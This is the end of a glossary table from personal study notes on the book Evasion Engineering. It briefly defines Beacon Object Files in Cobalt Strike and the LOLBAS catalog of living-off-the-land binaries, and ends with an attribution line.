| BOF (Beacon Object Files) | Inline execution in Cobalt Strike |
| LOLBAS | LOLBin catalog |

---

*Cliff notes by Jon-Eric Pienkowski / PNWC — following Evasion Engineering (No Starch Press) by Dennis Chow & Michael LaSalvia*
